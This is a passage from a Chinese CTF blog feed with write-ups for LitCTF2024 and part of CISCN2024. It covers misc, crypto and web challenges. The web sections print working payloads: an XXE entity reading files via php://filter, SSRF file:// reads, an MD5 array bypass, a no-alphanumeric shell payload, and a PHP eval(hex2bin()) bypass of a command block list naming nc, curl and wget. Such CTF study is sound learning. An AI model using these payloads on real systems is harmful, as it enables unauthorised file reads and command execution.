class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">foo</span> <span class="hljs-keyword">ANY</span> &gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=file:///var/www/html/flagggg.php&quot;</span> &gt;</span>]&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>最后base64解密就行</p><h1 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h1><p>剩下的题目都是考察java类的web题目，我还没学到也暂时没必要跟着复现了，总体来说题目也是较为友好的，自己还是要多复习多刷题，暂时就先到这了。</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>xxe</tag>
      
      <tag>伪协议</tag>
      
      <tag>命令执行</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Litctf2024</title>
    <link href="/2024/06/01/litctf2024/"/>
    <url>/2024/06/01/litctf2024/</url>
    
    <content type="html"><![CDATA[<p>前言：抽空写了一下挺适合新生的，但是复现环境一直没上，把中途写了的先放上面，如果后期上环境会写一下，要不然就咕了吧。</p><h1 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> Misc</h1><h2 id="涐贪恋和伱-甾7dé毎兮毎秒"><a class="markdownIt-Anchor" href="#涐贪恋和伱-甾7dé毎兮毎秒"></a> 涐贪恋和伱、甾―⑺dé毎兮毎秒</h2><p>下载图片，尝试改宽高，binwalk无果，steg看看，调成000就出来了</p><p><img src="/../images/litctf2024/%E6%AF%8F%E5%88%86%E6%AF%8F%E7%A7%92.png" alt="每分每秒"></p><h2 id="你说得对但__"><a class="markdownIt-Anchor" href="#你说得对但__"></a> 你说得对，但__</h2><p>下载扫一下，进入云原神，foremost得到四张图拼一下得到二维码</p><p>在word里面就可以</p><p><img src="/../images/litctf2024/%E4%BD%86%E6%98%AF.png" alt="但是"></p><p>扫一下得到flag</p><h2 id="原铁启动"><a class="markdownIt-Anchor" href="#原铁启动"></a> 原铁，启动！</h2><p>类似flag的特殊文字，以前写过类似的</p><p>放图片对照</p><p><img src="/../images/litctf2024/%E5%8E%9F%E7%A5%9E.jpeg" alt="原神"></p><p><img src="/../images/litctf2024/%E5%B4%A9%E9%93%81.png" alt="崩铁"></p><p>flag{good_gamer}</p><h2 id="盯帧珍珠"><a class="markdownIt-Anchor" href="#盯帧珍珠"></a> 盯帧珍珠</h2><p>010看一下是gif改一下，写个脚本出截图</p><img src="/../images/litctf2024/frame_7.png" alt="frame_7" style="zoom:25%;"><img src="/../images/litctf2024/frame_21.png" alt="frame_21" style="zoom:25%;"><img src="/../images/litctf2024/frame_31.png" alt="frame_31" style="zoom:25%;"><img src="/../images/litctf2024/frame_55.png" alt="frame_55" style="zoom:25%;"><h2 id="everywhere-we-go"><a class="markdownIt-Anchor" href="#everywhere-we-go"></a> Everywhere We Go</h2><p>下载得到MP3</p><p>用aud看一下找到flag</p><p><img src="/../images/litctf2024/where.png" alt="where"></p><h2 id="舔到最后应有尽有"><a class="markdownIt-Anchor" href="#舔到最后应有尽有"></a> 舔到最后应有尽有</h2><p>密文，看着眼熟一把梭</p><p><img src="/../images/litctf2024/%E8%88%94.png" alt="舔"></p><h2 id="关键太关键了"><a class="markdownIt-Anchor" href="#关键太关键了"></a> 关键，太关键了!</h2><p>jetnta{e_kess_ymu_imss}</p><p>猜测前面对应的是litctf，后面估计就是i_miss_you_什么,写个代码看出现词频</p><p>得到为b，最后为boss</p><h1 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h1><h2 id="sas-serializing-authentication-system"><a class="markdownIt-Anchor" href="#sas-serializing-authentication-system"></a> SAS - Serializing Authentication System</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;secure_password&#x27;</span>);<br><br><span class="hljs-comment">// 序列化并编码对象</span><br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><br></code></pre></td></tr></table></figure><p>Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjE1OiJzZWN1cmVfcGFzc3dvcmQiO30=</p><p>得到答案</p><h2 id="exx"><a class="markdownIt-Anchor" href="#exx"></a> exx</h2><p>xxe构造，bp发包</p><p><img src="/../images/litctf2024/exx.png" alt="exx"></p><h2 id="一个池子"><a class="markdownIt-Anchor" href="#一个池子"></a> 一个…池子？</h2><p>测试为ssit,fenjing一把梭</p><p><img src="/../images/litctf2024/%E6%B1%A0%E5%AD%90.png" alt="池子"></p><h2 id="浏览器也能套娃"><a class="markdownIt-Anchor" href="#浏览器也能套娃"></a> 浏览器也能套娃？</h2><p>这题的话考察的是ssrf，这方面类型的题目之前没写过，相关的知识点也不太清楚。</p><p>先随机尝试看看</p><p><img src="/../images/litctf2024/%E5%A5%971.png" alt="套1"></p><p>正常输入网站是可以的，尝试输入其他的看看</p><p><img src="/../images/litctf2024/%E5%A5%972.png" alt="套2"></p><p>明显是ssrf，尝试绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">file:///flag<br></code></pre></td></tr></table></figure><p>或者用伪协议绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">php://filter/resource=/flag<br></code></pre></td></tr></table></figure><p>得到flag</p><h2 id="高亮主题划掉背景查看器"><a class="markdownIt-Anchor" href="#高亮主题划掉背景查看器"></a> 高亮主题(划掉)背景查看器</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// 文件包含漏洞演示</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>])) &#123;<br><br>    <span class="hljs-comment">// 读取并包含用户输入的文件</span><br><br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$file</span>, <span class="hljs-string">&#x27;..&#x27;</span>) === <span class="hljs-literal">false</span>) &#123;<br><br>        <span class="hljs-keyword">include</span> <span class="hljs-variable">$file</span>;<br><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Access denied.&quot;</span>;<br><br>    &#125;<br><br>&#125; <span class="hljs-keyword">else</span> &#123;<br><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;No file specified.&quot;</span>;<br><br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>看着像文件包含啊，匹配是否有…，试了一会没出，抓个包看看</p><p><img src="/../images/litctf2024/%E8%83%8C%E6%99%AF.png" alt="背景"></p><p>给theme输入flag,会有报错回显，那估计就是通过这个来具体在那一层需要挨个试</p><p><img src="/../images/litctf2024/%E8%83%8C%E6%99%AF1.png" alt="背景1"></p><p>得到flag</p><h2 id="百万美元的诱惑"><a class="markdownIt-Anchor" href="#百万美元的诱惑"></a> 百万美元的诱惑</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><br><span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> !== <span class="hljs-variable">$b</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b</span>)) &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$c</span>) &amp;&amp; <span class="hljs-variable">$c</span> &gt; <span class="hljs-number">2024</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;好康的&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;干巴爹干巴爹先辈~&quot;</span>);<br>        &#125;<br>    &#125;<br><span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;开胃小菜))&quot;</span>);<br>&#125;<br>开胃小菜))<br></code></pre></td></tr></table></figure><p>简单的分析一下传三个值，a和b是个很常规的MD5弱比教，c是利用php的特性就可以绕过</p><p><strong>方法1</strong>：数组绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?a[]=1&amp;b[]=2&amp;c=2025a<br></code></pre></td></tr></table></figure><p><strong>方法2</strong>：积累字符串</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?a=s878926199a&amp;b=s155964671a&amp;c=2025a<br></code></pre></td></tr></table></figure><p>跳到第二页面</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//flag in 12.php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;x&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$x</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;x&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-z0-9;`|#&#x27;\&quot;%&amp;\x09\x0a&gt;&lt;.,?*\-=\\[\]]/i&quot;</span>, <span class="hljs-variable">$x</span>))&#123;<br>            <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat &quot;</span>.<span class="hljs-variable">$x</span>.<span class="hljs-string">&quot;.php&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>很常见的无字母数字绕过，只要构造12就可以了</p><p>我尝试了异或和自反失败了，应该用的是linux的特性构造自增</p><p>可以看看这篇文章，好多题这篇都可以解决</p><p><a href="https://xz.aliyun.com/t/12242?time__1311=mqmhD5YIMD7GkDlc%2BEvPQT47qgxAxAIwxx&amp;alichlgref=https%3A%2F%2Fcn.bing.com%2F#toc-0">文章</a>，按照图片然后往后加就行</p><p><img src="/../images/litctf2024/dollar.png" alt="dollar"></p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))<br></code></pre></td></tr></table></figure><p>最后看一下源码得到flag</p><h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h1><h2 id="small_e"><a class="markdownIt-Anchor" href="#small_e"></a> small_e</h2><p>gpt一把梭</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><br>n = <span class="hljs-number">19041138093915757361446596917618836424321232810490087445558083446664894622882726613154205435993358657711781275735559409274819618824173042980556986038895407758062549819608054613307399838408867855623647751322414190174111523595370113664729594420259754806834656490417292174994337683676504327493103018506242963063671315605427867054873507720342850038307517016687659435974562024973531717274759193577450556292821410388268243304996720337394829726453680432751092955575512372582624694709289019402908986429709116441544332327738968785428501665254894444651547623008530708343210644814773933974042816703834571427534684321229977525229</span><br>c_list = [<span class="hljs-number">438976</span>, <span class="hljs-number">1157625</span>, <span class="hljs-number">1560896</span>, <span class="hljs-number">300763</span>, <span class="hljs-number">592704</span>, <span class="hljs-number">343000</span>, <span class="hljs-number">1860867</span>, <span class="hljs-number">1771561</span>, <span class="hljs-number">1367631</span>, <span class="hljs-number">1601613</span>, <span class="hljs-number">857375</span>, <span class="hljs-number">1225043</span>, <span class="hljs-number">1331000</span>, <span class="hljs-number">1367631</span>, <span class="hljs-number">1685159</span>, <span class="hljs-number">857375</span>, <span class="hljs-number">1295029</span>, <span class="hljs-number">857375</span>, <span class="hljs-number">1030301</span>, <span class="hljs-number">1442897</span>, <span class="hljs-number">1601613</span>, <span class="hljs-number">140608</span>, <span class="hljs-number">1259712</span>, <span class="hljs-number">857375</span>, <span class="hljs-number">970299</span>, <span class="hljs-number">1601613</span>, <span class="hljs-number">941192</span>, <span class="hljs-number">132651</span>, <span class="hljs-number">857375</span>, <span class="hljs-number">1481544</span>, <span class="hljs-number">1367631</span>, <span class="hljs-number">1367631</span>, <span class="hljs-number">1560896</span>, <span class="hljs-number">857375</span>, <span class="hljs-number">110592</span>, <span class="hljs-number">1061208</span>, <span class="hljs-number">857375</span>, <span class="hljs-number">1331000</span>, <span class="hljs-number">1953125</span>]<br><br>flag = <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> c_list:<br>    m, exact = gmpy2.iroot(c, <span class="hljs-number">3</span>)  <span class="hljs-comment"># 求立方根</span><br>    <span class="hljs-keyword">if</span> exact:<br>        flag += long_to_bytes(m).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;解密失败，密文可能过大或不是精确的立方&quot;</span>)<br><br><span class="hljs-built_in">print</span>(flag)<br><br></code></pre></td></tr></table></figure><h2 id="common_primes"><a class="markdownIt-Anchor" href="#common_primes"></a> common_primes</h2><p>gpt一把梭</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes, inverse, GCD<br><span class="hljs-keyword">import</span> gmpy2<br><br><span class="hljs-comment"># Given values</span><br>n1 = <span class="hljs-number">63306931765261881888912008095340470978772999620205174857271016152744820165330787864800482852578992473814976781143226630412780924144266471891939661312715157811674817013479316983665960087664430205713509995750877665395721635625035356901765881750073584848176491668327836527294900831898083545883834181689919776769</span><br>n2 = <span class="hljs-number">73890412251808619164803968217212494551414786402702497903464017254263780569629065810640215252722102084753519255771619560056118922616964068426636691565703046691711267156442562144139650728482437040380743352597966331370286795249123105338283013032779352474246753386108510685224781299865560425114568893879804036573</span><br>c1 = <span class="hljs-number">11273036722994861938281568979042367628277071611591846129102291159440871997302324919023708593105900105417528793646809809850626919594099479505740175853342947734943586940152981298688146019253712344529086852083823837309492466840942593843720630113494974454498664328412122979195932862028821524725158358036734514252</span><br>c2 = <span class="hljs-number">42478690444030101869094906005321968598060849172551382502632480617775125215522908666432583017311390935937075283150967678500354031213909256982757457592610576392121713817693171520657833496635639026791597219755461854281419207606460025156812307819350960182028395013278964809309982264879773316952047848608898562420</span><br>e = <span class="hljs-number">65537</span><br><br><span class="hljs-comment"># Compute gcd of n1 and n2 to find shared prime p</span><br>p = GCD(n1, n2)<br><br><span class="hljs-comment"># Compute the other primes q1 and q2</span><br>q1 = n1 // p<br>q2 = n2 // p<br><br><span class="hljs-comment"># Compute phi values</span><br>phi_n1 = (p - <span class="hljs-number">1</span>) * (q1 - <span class="hljs-number">1</span>)<br>phi_n2 = (p - <span class="hljs-number">1</span>) * (q2 - <span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># Compute the private keys d1 and d2</span><br>d1 = inverse(e, phi_n1)<br>d2 = inverse(e, phi_n2)<br><br><span class="hljs-comment"># Decrypt the messages</span><br>m1 = <span class="hljs-built_in">pow</span>(c1, d1, n1)<br>m2 = <span class="hljs-built_in">pow</span>(c2, d2, n2)<br><br><span class="hljs-comment"># Convert the long integers back to bytes</span><br>message1 = long_to_bytes(m1)<br>message2 = long_to_bytes(m2)<br><br><span class="hljs-comment"># Check if the messages are equal</span><br><span class="hljs-keyword">if</span> message1 == message2:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Decrypted message:&quot;</span>, message1.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;The decrypted messages are different.&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Message 1:&quot;</span>, message1.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Message 2:&quot;</span>, message2.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>ssrf</tag>
      
      <tag>ssti</tag>
      
      <tag>xxe</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ciscn2024</title>
    <link href="/2024/05/30/ciscn/ciscn2024/"/>
    <url>/2024/05/30/ciscn/ciscn2024/</url>
    
    <content type="html"><![CDATA[<p>前言：第一次打ciscn，但是web题目是一个不会，借此为数不多的时间想把能照着wp复现的题目写一下。题目目前在ctfshow有复现靶场。</p><h2 id="simple_php"><a class="markdownIt-Anchor" href="#simple_php"></a> simple_php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>, <span class="hljs-string">&#x27;/var/www/html/&#x27;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">escapeshellcmd</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]); <br>     <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget|\&#x27;|\&quot;|id|whoami/i&#x27;</span>, <span class="hljs-variable">$cmd</span>)) &#123;<br>         <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$cmd</span>);<br>&#125;<br>&#125;<br><br><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这是题目的源码，正则限制了很多，可以用在线网站看一下，<a href="https://www.jyshare.com/front-end/7625/#!flags=&amp;re=ls%7Cdir%7Cnl%7Cnc%7Ccat%7Ctail%7Cmore%7Cflag%7Csh%7Ccut%7Cawk%7Cstrings%7Cod%7Ccurl%7Cping%7C%5C*%7Csort%7Cch%7Czip%7Cmod%7Csl%7Cfind%7Csed%7Ccp%7Cmv%7Cty%7Cgrep%7Cfd%7Cdf%7Csudo%7Cmore%7Ccc%7Ctac%7Cless%7Chead%7C%5C.%7C%7B%7C%7D%7Ctar%7Czip%7Cgcc%7Cuniq%7Cvi%7Cvim%7Cfile%7Cxxd%7Cbase64%7Cdate%7Cbash%7Cenv%7C%5C%3F%7Cwget%7C%5C'%7C%5C%22%7Cid%7Cwhoami%2Fi">网站</a>，这里还将到了escapeshellcmd这个函数</p><h3 id="escapeshellcmd函数"><a class="markdownIt-Anchor" href="#escapeshellcmd函数"></a> escapeshellcmd函数</h3><p>转义和规范化操作有助于确保命令字符串在传递给命令行时能够正确解析，并且不会被误认为是命令或其他恶意代码。</p><p>比如这几种情况</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs markdown">替换命令字符串中的单引号 (&#x27;) 为反斜杠和单引号组合 (\&#x27;)。<br>替换命令字符串中的双引号 (&quot;) 为反斜杠和双引号组合 (\&quot;)。<br>删除命令字符串中的换行符 (\n)。<br>删除命令字符串中的回车符 (\r)。<br></code></pre></td></tr></table></figure><p>比如这种情况</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;127.0.0.1&#x27; -x&quot;</span>;  <span class="hljs-comment">// 这里添加了分号</span><br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">escapeshellcmd</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span> . <span class="hljs-string">&quot;\n&quot;</span>;  <span class="hljs-comment">// 输出 $a，并换行</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span> . <span class="hljs-string">&quot;\n&quot;</span>;  <span class="hljs-comment">// 输出 $b，并换行</span><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>输出为</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown">127.0.0.1&#x27; -x<br>127.0.0.1^&#x27; -x<br></code></pre></td></tr></table></figure><p>就是对 ‘进行了转义，再根据题目分析一下好像并没有禁掉\和`尝试可以使用php -r来执行</p><h3 id="解法1"><a class="markdownIt-Anchor" href="#解法1"></a> 解法1</h3><p>输入</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">cmd</span>=php -r var_dump(<span class="hljs-string">`l\s`</span>);<br></code></pre></td></tr></table></figure><p><img src="/../../images/ciscn/ciscn2024/simple.png" alt="simple"></p><p>进行查看后并没有找到，尝试查看etc/passwd的内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cmd=<span class="hljs-built_in">paste</span> /etc/passwd//paste用于合并文件行<br></code></pre></td></tr></table></figure><p><img src="../../images/ciscn/ciscn2024//simple1.png" alt="simple1"></p><p>猜测可能数据藏在mysql数据库中，尝试弹shell，但是在连接之后webshell没有回显这里看到一个方法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cmd=mysqldump -uroot -proot --all-databases<br></code></pre></td></tr></table></figure><p>猜测用户名和密码都是默认的,把数据都dump下来，直接爆库搜就行，用的ctfshow，然后搜一下就行</p><p><img src="../../images/ciscn/ciscn2024//simple2.png" alt="simple2"></p><h3 id="解法2"><a class="markdownIt-Anchor" href="#解法2"></a> 解法2:</h3><p>看了一下内容，由于禁用了很多，可以转hex，然后用php自带的函数，由于不能带引号只能强制截取，直接上payload吧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cmd=php -r <span class="hljs-built_in">eval</span>(hex2bin(substr(_6563686f20606c73202f603b,1)));<br></code></pre></td></tr></table></figure><p><img src="../../images/ciscn/ciscn2024//simple3.png" alt="simple3"></p><p>之后一些列的可以通过先转，逐步爆内容，或者粗暴一点也行。</p><h3 id="解法3"><a class="markdownIt-Anchor" href="#解法3"></a> 解法3:</h3><p>其实连应该是可以连的，但是需要用python监听，我技术太捞了,把这种情况先放在这。网上其他博客或许有。</p><h2 id="easycms"><a class="markdownIt-Anchor" href="#easycms"></a> easycms</h2><p>这题知识点我暂时还没有学习，把流程过一下。</p><p>先看一下系统，提示在github上找源码</p><p><img src="../../images/ciscn/ciscn2024//cms1.png" 